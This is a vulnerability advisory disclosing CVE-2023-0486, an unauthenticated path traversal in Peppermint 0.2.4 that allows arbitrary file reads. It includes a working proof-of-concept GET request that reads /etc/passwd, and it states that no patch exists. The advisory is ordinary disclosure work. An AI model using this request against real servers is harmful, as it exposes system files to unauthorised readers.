---
slug: advisories/smith/
title: Peppermint 0.2.4 - Arbitrary File Read via Path Traversal
authors: Carlos Bello
writer: cbello
codename: smith
product: Peppermint 0.2.4
date: 2023-02-06 12:00 COT
cveid: CVE-2023-0486
severity: 7.5
description: Peppermint 0.2.4 - Arbitrary File Read via Path Traversal
keywords: Fluid Attacks, Security, Vulnerabilities, Peppermint, Arbitrary File Read
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                      |
| --------------------- | -------------------------------------------------------------------- |
| **Name**              | Peppermint 0.2.4 - Arbitrary File Read via Path Traversal            |
| **Code name**         | [Smith](https://en.wikipedia.org/wiki/Aaron_Smith_(DJ))              |
| **Product**           | Peppermint                                                           |
| **Affected versions** | 0.2.4                                                                |
| **State**             | Public                                                               |
| **Release Date**      | 2023-02-06                                                           |

## Vulnerability

|                       |                                                                                                             |
| --------------------- | ------------------------------------------------------------------------------------------------------------|
| **Kind**              | Lack of data validation - Path Traversal                                                                    |
| **Rule**              | [063. Lack of data validation - Path Traversal](https://docs.fluidattacks.com/criteria/vulnerabilities/063) |
| **Remote**            | Yes                                                                                                         |
| **CVSSv3 Vector**     | CVSS:AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                                                                    |
| **CVSSv3 Base Score** | 7.5                                                                                                         |
| **Exploit available** | No                                                                                                          |
| **CVE ID(s)**         | [CVE-2023-0486](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0486)                               |

## Description

Peppermint version 0.2.4 allows an unauthenticated external attacker to
read arbitrary local files from the server. This is possible because the
application uses the filename sent by the user to construct the absolute
path to the file.

## Vulnerability

This vulnerability occurs because the application uses the filename sent by
the user to construct the absolute path to the file.

### Exploit

To exploit this vulnerability, we only need to send a request like the following
to the server.

```txt
GET /api/v1/ticket/1/file/download?filepath=/etc/passwd HTTP/1.1
Host: vulnerable.com
User-Agent: Fluid Attacks
```

## Evidence of exploitation

![arbitrary-file-read](https://user-images.githubusercontent.com/51862990/214438102-61a231c9-d4b0-4075-bea2-3fb660713d95.png)

## Our security policy

We have reserved the ID CVE-2023-0486 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Peppermint 0.2.4

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/Peppermint-Lab/peppermint/>

## Timeline

<time-lapse
  discovered="2023-01-24"
  contacted="2022-01-24"
  replied=""
  confirmed=""
  patched=""
  disclosure="2023-02-06">
</time-lapse>
